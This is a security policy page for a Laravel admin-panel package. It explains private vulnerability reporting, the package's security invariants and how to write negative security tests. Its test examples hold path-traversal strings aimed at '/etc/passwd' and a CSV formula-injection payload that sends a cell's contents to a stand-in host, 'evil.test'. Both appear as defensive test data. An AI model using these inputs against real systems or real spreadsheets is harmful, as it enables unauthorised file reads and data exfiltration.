# Security

Two things: how to report a vulnerability privately, and what the suite already guarantees so you can tell whether what you have found is a hole or a documented boundary. A panel is a large public surface — every table parameter reaches a query builder, every action endpoint takes a record key from a payload, every export writes a file addressed by name — and the properties that surface rests on are only guarantees because something fails when they break.

## Reporting a vulnerability

Report it privately, by email, to the maintainer address recorded in `composer.json`:

```json
"authors": [
    {
        "name": "Alan Gentina",
        "email": "alangentina95@gmail.com"
    }
]
```

**Do not open a GitHub issue and do not open a pull request.** The `support.issues` URL in `composer.json` is the public tracker, and a public issue is a disclosure. That applies to a pull request too: the diff describes the hole before anybody has upgraded.

This repository carries no `SECURITY.md` and no published advisory or embargo process. The email address above is the channel; nothing else is documented, so do not assume a private reporting form exists until you have found one.

A useful report has five things:

1. **The version.** `composer show chocoalano/panel`, or the tag.
2. **Which surface.** A panel route, the action endpoint, the upload endpoint, the export download, the options endpoint, the search endpoint, a schema.
3. **A request.** The literal URL or payload, and the user it was sent as.
4. **What happened**, and what the panel should have done instead.
5. **Whether it is silent.** Something that answers 200 and does the wrong thing is more urgent than something that errors, because nobody is looking for it.

If you can express it as a failing test in `tests/Feature/Panel/Negative/`, attach the file. That is the form a fix will take anyway.

## What is in scope

Only the shipped surface. `.gitattributes` decides what an installed package contains, and everything `export-ignore`d is absent from it:

| In scope | Not in scope |
| --- | --- |
| `src/` — the framework | `examples/` — the test application |
| `config/panda-panel.php` | `tests/` and `frontend/` |
| `database/` migrations | `docs/` |
| `stubs/` — what the generators write | This repository's own CI and tooling |
| `resources/` — the published Vue and CSS | An application's own code around a panel |

A finding in `examples/` is worth reporting as an ordinary bug, because those files are patterns people copy — but it is not a vulnerability in anything an application installs.

Two things that are documented boundaries rather than holes:

- **Navigation visibility is not access control.** A hidden item is a convenience. Routes, actions, pages and widgets each authorize independently, and there are tests that request a hidden item's URL directly.
- **A public panel is public by explicit middleware.** Panel routes carry `auth` by default; a panel
  that calls `authMiddleware([])` deliberately allows guests through to `canAccess()`, which receives
  `null`.

## The invariants

ADR 001 states these as implications of the design, and `tests/Feature/Panel/Negative/` states each as something that must not happen. They are the list to check a change against.

| Invariant | Where it is enforced |
| --- | --- |
| No closure, SQL, policy internal or configuration reaches the browser. Schemas serialize scalars and arrays. | Serialization, asserted across the suite |
| The frontend sends identifiers only — an action name, a resource slug, record keys. The backend resolves what to run. | `PanelActionController` |
| Component and icon names resolve through build-time registries, so a name that was not compiled in cannot be reached whatever the request says. | `icons/registry.ts`, `widgets/registry.ts` |
| Query parameters are whitelisted by schema. An unknown sort column, an out-of-range `perPage` or an unrecognised filter is ignored rather than reaching the builder. | `TableQuery` |
| LIKE wildcards in a search term are escaped, and the term is length-bounded. | `TableQuery` |
| Widget authorization precedes data resolution, so an unauthorized widget never runs a query. | `Widget::canView()` |
| Bulk actions are all-or-nothing about authorization: every record in the selection is authorized before any of them is touched, so one forbidden record refuses the whole request with a 403 and writes nothing. Each record's own write then runs through `Action::execute()`, inside whatever transaction that action resolves. | `Action::executeBulk()` |
| A record `Resource::query()` excludes is unreachable through every endpoint that takes a key. | `Resource::query()`, `findRecord()`, `findRecords()` |
| The action endpoint resolves a resource against **that panel's** registry, so a session on one panel cannot address another panel's resource. | `PanelActionController` |
| An export or import report is addressed by name inside a directory built from the authenticated user. | The download controllers |
| `is_admin` is not mass-assignable; registration and profile update cannot set it. | The example `User`, asserted |
| Passwords never round-trip. A password field always serializes as null, and the view page skips password fields rather than displaying a hash. | `PasswordInput::formValue()`, `ViewRecord` |
| CSV cells that a spreadsheet would evaluate as a formula are neutralised. | `PandaPanel\Support\Spreadsheet\Csv` |

None of them is cached. `panel:cache` holds class names only — never authorization results, navigation active state, badge values, record data or widget data, because all of those depend on the current user or URL and caching one would serve one person's answers to another. A test asserts the manifest contains no closure.

## The eleven negative files

| File | States that |
| --- | --- |
| `HostileTableInputTest` | a sort, filter, group, search or page parameter the schema never declared is ignored, not escaped |
| `PrivilegeEscalationTest` | no guessed URL, hand-written POST or swapped id gets past a policy |
| `ScopeBypassTest` | a record `Resource::query()` excludes is unreachable through every endpoint that takes a key |
| `SchemaEscapeTest` | a create or edit writes only what the form declared |
| `MalformedInputTest` | input of the wrong shape is answered, never crashed into |
| `FileAndDataAccessTest` | an export, import report or notification belongs to exactly one user |
| `SpreadsheetFormulaTest` | a CSV cell cannot become a formula in the reader's spreadsheet |
| `DistributionTest` | the Composer archive carries `package.json`, so the installer can name the npm dependencies it is meant to check, and keeps `package-lock.json` out |
| `SchemaMistakeTest` | a schema that cannot mean what it says refuses at build time, and says which name is wrong |
| `UnreachableDeclarationTest` | a declaration pointing at something that cannot answer fails with a message naming it |
| `SilentAbsenceTest` | "my resource is missing" has a cause somebody can read |

The last three are there because a silent failure is a security property too: a resource missing from a sidebar because its policy is absent looks identical to a resource somebody deliberately hid.

## Writing a security test

Three rules, all learned from tests that passed for the wrong reason.

**Delete the guard and confirm the test fails.** Three of the guards in this suite were verified that way. A test that passes with the guard removed is decorative, and the cost of finding that out later is that somebody trusted it.

**Set up the thing the attack would reach.** A traversal test against a file that does not exist misses for the wrong reason:

```php
it('refuses every shape of traversal in an export file name', function (): void {
    // Both rungs a traversal would climb to: the disk root, and the directory
    // the per-user folders sit in. Without these the directories do not exist,
    // every attempt misses for the wrong reason, and the test would pass with
    // the guard deleted.
    Storage::disk('local')->put('secret.csv', 'ROOT SECRET');
    Storage::disk('local')->put(UserExporter::directory().'/secret.csv', 'PARENT SECRET');

    $this->actingAs($this->admin);

    $attempts = [
        '../secret.csv',
        '..%2Fsecret.csv',
        '%2e%2e%2fsecret.csv',
        '....//secret.csv',
        '/etc/passwd',
        'subdir/secret.csv',
        '.',
    ];

    // ... each one refused ...
});
```

**Prove the mechanism, not the absence.** A refusal test alongside a success test is what separates a working guard from a broken endpoint, so every group of refusals in this suite has a positive counterpart — `serves a user their own export, so the refusals above are not just a broken endpoint`, and `reaches a record inside the scope, so the refusals above are the scope and not a broken route`.

The same shape applies to a whitelist. Showing that a hostile value is ignored proves nothing unless a legitimate value is honoured:

```php
// `avatar` and `accountAge` are real columns and neither is ->sortable().
expect(appliedSortFor('sort=avatar'))->toBeNull();
expect(appliedSortFor('sort=accountAge'))->toBeNull();

// And the one that is sortable is honoured.
expect(appliedSortFor('sort=name'))->toBe('name');
```

And for output escaping, assert the semantics rather than the syntax. Quoting a CSV cell changes how the file parses, not what the cell means once parsed:

```php
it('neutralizes the exfiltration formula rather than merely quoting it', function (): void {
    $payload = '=HYPERLINK("http://evil.test?x="&A1,"Click me")';

    $cells = csvCells(csvLine([$payload]));

    expect($cells[0])->toBe("'".$payload)
        ->and($cells[0])->not->toStartWith('=');
});
```

## Fixing one

A security fix is a normal pull request with three additions:

1. **A test in `tests/Feature/Panel/Negative/`** that fails without the fix.
2. **A `### Security` entry in `CHANGELOG.md`**, first in the `[Unreleased]` block. The house style names the attacker, the victim, the CWE where there is one, and why the obvious fix was not the fix — the CSV entry is the model: "Quoting never prevented it: CSV quoting is about parsing the file, not about what a cell means once parsed."
3. **An entry in [`docs/upgrading/breaking-changes.md`](../upgrading/breaking-changes.md)** when an application has to do something. Silent changes go at the top of that list, because nothing else will tell anybody.

Do not open the pull request until the report has been answered. See [Releases](releases.md) for how the fix becomes a version.

## Development aids that are not controls

Three settings make a silent denial loud while developing. None of them is a security control, and two are explicitly worse in production:

```php
$panel->strictAuthorization();   // strictAuthorization(bool $strictAuthorization = true): self
```

A missing policy reads exactly like a policy that said no. With strict authorization on, a resource whose model has no registered policy — or whose policy is missing the ability being checked — throws `PandaPanel\Exceptions\PanelAuthorizationException` instead of denying. It is off by default because it turns a 403 into a 500, and in production a denial is the safer answer.

The other two are development-only by construction: the panel warns once per unregistered icon or component name, and once per model whose absent policy dropped a resource from the navigation. Both are silent in production, because they are build problems rather than runtime ones.

## Notes

- **A 403 rather than a redirect is deliberate.** A redirect would tell an unauthorized user that a different panel exists, and would loop for a user with no panel at all.
- **`Gate::allows()` denies when no policy exists.** That is correct and indistinguishable from a policy that considered the question and said no, which is why `strictAuthorization()` exists and why `SilentAbsenceTest` does.
- **Authorization never goes through `Gate::allows()` directly.** It goes through `PandaPanel\Support\PolicyGate::allows()`, which is where the strict behaviour lives. A second copy of that rule would be a second place to keep true.
- **Formula neutralisation is on by default and overridable per exporter.** `Exporter::escapesFormulas(): bool` returns `true`; override it to `false` only for a file another *program* reads, where nothing evaluates anything and the leading apostrophe would be corruption rather than a fix. Never for a file a person opens. XLSX was never affected: `Xlsx` writes `t="inlineStr"` cells, and a formula in that format lives in an `<f>` element the writer does not emit.
- **The upload endpoint reads its context from the query string only.** A form whose values happened to include a `resource` key could previously point the upload at a different one.
- **Panel access is a door, not a permission system.** Passing it grants entry and nothing else; every resource, page, widget and action authorizes independently at the point it is used.
- **The Laravel floor is a security floor.** Laravel 11 is not supported and cannot be — every 11.x release is flagged by unpatched advisories and Composer refuses to resolve against it.

## See also

- [Running the tests](testing.md) — where a negative test goes and how to run it
- [Negative security tests](../testing/negative-security-tests.md) — every file, test by test
- [Architecture decisions](architecture-decisions.md) — the design these invariants follow from
- [Pull requests](pull-requests.md) — the ordinary process, for everything that is not this
- [Releases](releases.md) — the changelog entry and the tag
- [Authorization](../concepts/authorization.md) and [Panel access rules](../panels/access.md)
- [Resource authorization](../resources/authorization.md), [page](../pages-navigation/authorization.md), [widget](../widgets/authorization.md)
- [Testing authorization](../testing/authorization.md) and [tenancy](../testing/tenancy.md)
- [Production checklist](../deployment/production-checklist.md)
